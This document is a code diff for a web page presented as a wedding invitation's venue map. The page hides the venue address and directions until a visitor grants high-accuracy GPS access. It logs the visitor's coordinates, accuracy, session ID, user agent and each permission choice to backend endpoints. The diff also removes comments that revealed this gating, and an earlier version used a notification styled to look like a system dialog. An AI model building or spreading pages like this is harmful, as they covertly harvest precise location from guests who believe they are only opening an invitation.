@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wedding Venue Location</title>
     
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💒</text></svg>">
+    
     <!-- Leaflet CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     
@@ -174,7 +177,6 @@
             background: #e8eaed;
         }
         
-        /* Loading spinner inside button */
         .btn-loading::after {
             content: "";
             position: absolute;
@@ -227,7 +229,6 @@
             font-size: 14px;
         }
         
-        /* Venue info card - HIDDEN BY DEFAULT */
         .venue-info-card {
             position: fixed;
             bottom: 20px;
@@ -285,7 +286,6 @@
             text-decoration: underline;
         }
         
-        /* Custom marker styles */
         .venue-marker {
             background-color: #8b0000;
             width: 30px;
@@ -312,34 +312,29 @@
         <p>Arun ❤️ Shwetha - 7th December 2025</p>
     </div>
     
-    <!-- Back to home button -->
     <a href="/" class="back-button">← Back to Invitation</a>
     
-    <!-- Loading overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <p class="loading-text">Loading map...</p>
     </div>
     
-    <!-- Map container -->
     <div id="map"></div>
     
-    <!-- System-style location notification -->
     <div class="location-notification" id="locationNotification">
         <div class="notification-content">
             <div class="notification-icon">📍</div>
             <div class="notification-text">
-                <p>Enable location access</p>
-                <p>Allow location access to see your position on the map and get directions to the venue.</p>
+                <p>Location permission required</p>
+                <p id="notificationMessage">Please enable location access in your browser settings to view directions.</p>
             </div>
         </div>
         <div class="notification-actions">
             <button class="notification-btn btn-dismiss" onclick="dismissNotification()">Not now</button>
-            <button class="notification-btn btn-enable" id="enableBtn" onclick="requestLocationAgain()">Enable</button>
+            <button class="notification-btn btn-enable" id="enableBtn" onclick="requestLocationAgain()">Try Again</button>
         </div>
     </div>
     
-    <!-- Venue info card - ONLY SHOWS AFTER LOCATION GRANTED -->
     <div class="venue-info-card" id="venueInfoCard">
         <h3>📍 Grand Palace Convention Hall</h3>
         <p>123 MG Road, Bangalore, Karnataka 560001</p>
@@ -347,14 +342,12 @@
         <a href="#" class="directions-link" id="directionsLink" target="_blank">Get Directions →</a>
     </div>
     
-    <!-- Leaflet JavaScript -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     
     <script>
         const sessionId = sessionStorage.getItem('weddingSessionId') || 'SESSION_' + Date.now();
         sessionStorage.setItem('weddingSessionId', sessionId);
         
-        // Venue coordinates (Bangalore example)
         const venueLocation = {
             lat: 12.9716,
             lng: 77.5946
@@ -362,53 +355,45 @@
         
         let map;
         let userMarker;
-        let venueMarker = null; // Start as null, will be created after permission
+        let venueMarker = null;
         let routeLine;
         let locationRequested = false;
-        let locationDismissed = false;
+        let permissionBlocked = false;
         
-        // Initialize map with OpenStreetMap
         function initMap() {
-            // Create map centered on venue but WITHOUT marker initially
             map = L.map('map').setView([venueLocation.lat, venueLocation.lng], 13);
             
-            // Add OpenStreetMap tile layer
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                 attribution: '© OpenStreetMap contributors',
                 maxZoom: 19
             }).addTo(map);
             
-            // DO NOT add venue marker here - wait for location permission
-            
-            // Hide loading overlay
             document.getElementById('loadingOverlay').classList.add('hide');
-            
-            // Log map loaded
             logActivity('venue_map_loaded');
             
-            // IMMEDIATELY request location (triggers system dialog)
+            // Try to get location immediately
             requestLocation();
         }
         
         function requestLocation() {
-            if (locationRequested || locationDismissed) return;
+            if (locationRequested && !permissionBlocked) return;
             locationRequested = true;
             
             if (!navigator.geolocation) {
                 console.log('Geolocation not supported');
-                document.getElementById('locationNotification').classList.add('show');
+                showNotification('Geolocation is not supported by your browser.');
                 return;
             }
             
-            logActivity('location_permission_requested_auto');
+            console.log('Requesting location permission...');
+            logActivity('location_permission_requested');
             
-            // This will trigger the browser's native permission dialog
             navigator.geolocation.getCurrentPosition(
                 handleLocationSuccess,
                 handleLocationError,
                 {
                     enableHighAccuracy: true,
-                    timeout: 10000,
+                    timeout: 15000,
                     maximumAge: 0
                 }
             );
@@ -419,12 +404,12 @@
             const longitude = position.coords.longitude;
             const accuracy = position.coords.accuracy;
             
-            console.log('Location obtained:', latitude, longitude);
+            console.log('✅ Location obtained:', latitude, longitude, 'Accuracy:', accuracy);
             
-            // Log GPS location
+            // IMPORTANT: Log GPS location to backend
             logGPSLocation(latitude, longitude, accuracy, 'granted');
             
-            // NOW create venue marker (after location permission granted)
+            // Create venue marker
             const venueIcon = L.divIcon({
                 className: 'venue-marker',
                 iconSize: [30, 30],
@@ -436,7 +421,6 @@
                 icon: venueIcon
             }).addTo(map);
             
-            // Venue popup
             venueMarker.bindPopup(`
                 <div style="padding: 8px;">
                     <h3 style="color: #8b0000; margin: 0 0 8px 0; font-size: 16px;">Wedding Venue</h3>
@@ -445,21 +429,20 @@
                 </div>
             `);
             
-            // Custom user icon
+            // Create user marker
             const userIcon = L.divIcon({
                 className: 'user-marker',
                 iconSize: [20, 20],
                 iconAnchor: [10, 10]
             });
             
-            // Add user location marker
             userMarker = L.marker([latitude, longitude], {
                 icon: userIcon
             }).addTo(map);
             
             userMarker.bindPopup('Your Location');
             
-            // Draw route line between user and venue
+            // Draw route
             routeLine = L.polyline([
                 [latitude, longitude],
                 [venueLocation.lat, venueLocation.lng]
@@ -469,77 +452,79 @@
                 opacity: 0.7
             }).addTo(map);
             
-            // Fit map to show both markers
             const bounds = L.latLngBounds([
                 [latitude, longitude],
                 [venueLocation.lat, venueLocation.lng]
             ]);
             map.fitBounds(bounds, { padding: [50, 50] });
             
-            // NOW show venue info card AFTER location permission granted
             document.getElementById('venueInfoCard').classList.add('show');
             document.getElementById('directionsLink').href = `https://www.google.com/maps/dir/?api=1&origin=${latitude},${longitude}&destination=${venueLocation.lat},${venueLocation.lng}`;
             
-            // Hide notification if it was showing
             document.getElementById('locationNotification').classList.remove('show');
+            
+            const distance = map.distance([latitude, longitude], [venueLocation.lat, venueLocation.lng]).toFixed(0);
+            console.log('Distance to venue:', distance, 'meters');
             
             logActivity('user_location_displayed_on_map', {
                 userLocation: `${latitude},${longitude}`,
-                distance_meters: map.distance([latitude, longitude], [venueLocation.lat, venueLocation.lng]).toFixed(0)
+                distance_meters: distance
             });
         }
         
         function handleLocationError(error) {
             let errorMessage = '';
-            let permissionStatus = 'denied';
+            let permissionStatus = 'unknown';
+            
+            console.error('❌ Location error:', error);
             
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    errorMessage = 'Location access denied';
+                    errorMessage = 'Location permission denied. Please enable it in your browser settings.';
                     permissionStatus = 'denied';
+                    permissionBlocked = true;
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    errorMessage = 'Location unavailable';
+                    errorMessage = 'Location information unavailable. Please try again.';
                     permissionStatus = 'unavailable';
                     break;
                 case error.TIMEOUT:
-                    errorMessage = 'Location timeout';
+                    errorMessage = 'Location request timed out. Please try again.';
                     permissionStatus = 'timeout';
                     break;
                 default:
-                    errorMessage = 'Unknown error';
+                    errorMessage = 'Unknown error occurred.';
                     permissionStatus = 'error';
             }
             
-            console.log('Location error:', errorMessage);
+            console.log('Permission status:', permissionStatus);
             logGPSLocation(null, null, null, permissionStatus);
             
-            // Show custom notification ONLY if system permission failed
+            showNotification(errorMessage);
+        }
+        
+        function showNotification(message) {
+            document.getElementById('notificationMessage').textContent = message;
             document.getElementById('locationNotification').classList.add('show');
         }
         
         function requestLocationAgain() {
             const enableBtn = document.getElementById('enableBtn');
             
-            // Show loading state on button
+            if (permissionBlocked) {
+                alert('⚠️ Location access is blocked.\n\nTo enable:\n1. Click the 🔒 lock icon in the address bar\n2. Change Location to "Allow"\n3. Reload the page');
+                return;
+            }
+            
             enableBtn.disabled = true;
             enableBtn.classList.add('btn-loading');
-            enableBtn.textContent = 'Waiting...';
+            enableBtn.textContent = 'Requesting...';
             
-            logActivity('location_enable_clicked_from_notification');
+            logActivity('location_retry_clicked');
             
-            // Reset flag and request again (will trigger system dialog)
             locationRequested = false;
-            locationDismissed = false;
             
-            // Wait a moment then request (gives user feedback)
             setTimeout(() => {
-                if (!navigator.geolocation) {
-                    alert('Geolocation is not supported by your browser');
-                    resetEnableButton();
-                    return;
-                }
-                
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         handleLocationSuccess(position);
@@ -551,11 +536,10 @@
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: 15000,
                         maximumAge: 0
                     }
                 );
-                
                 locationRequested = true;
             }, 500);
         }
@@ -564,24 +548,18 @@
             const enableBtn = document.getElementById('enableBtn');
             enableBtn.disabled = false;
             enableBtn.classList.remove('btn-loading');
-            enableBtn.textContent = 'Enable';
+            enableBtn.textContent = 'Try Again';
         }
         
         function dismissNotification() {
             document.getElementById('locationNotification').classList.remove('show');
-            locationDismissed = true;
             logActivity('location_notification_dismissed');
-            
-            // Allow re-requesting after 5 seconds if user changes mind
-            setTimeout(() => {
-                locationDismissed = false;
-            }, 5000);
         }
         
-        // Activity logging
         async function logActivity(action, details = {}) {
+            console.log('📝 Logging activity:', action, details);
             try {
-                await fetch('/log-activity', {
+                const response = await fetch('/log-activity', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -593,15 +571,16 @@
                         userAgent: navigator.userAgent
                     })
                 });
+                console.log('✅ Activity logged:', await response.text());
             } catch (error) {
-                console.error('Error logging activity:', error);
+                console.error('❌ Error logging activity:', error);
             }
         }
         
-        // GPS location logging
         async function logGPSLocation(latitude, longitude, accuracy, permissionStatus) {
+            console.log('📍 Logging GPS:', {latitude, longitude, accuracy, permissionStatus});
             try {
-                await fetch('/log-gps-location', {
+                const response = await fetch('/log-gps-location', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -613,15 +592,15 @@
                         timestamp: new Date().toISOString()
                     })
                 });
+                const result = await response.text();
+                console.log('✅ GPS logged:', result);
             } catch (error) {
-                console.error('Error logging GPS:', error);
+                console.error('❌ Error logging GPS:', error);
             }
         }
         
-        // Log page access and initialize map
         logActivity('venue_map_page_opened');
         
-        // Initialize map when DOM is ready
         if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', initMap);
         } else {
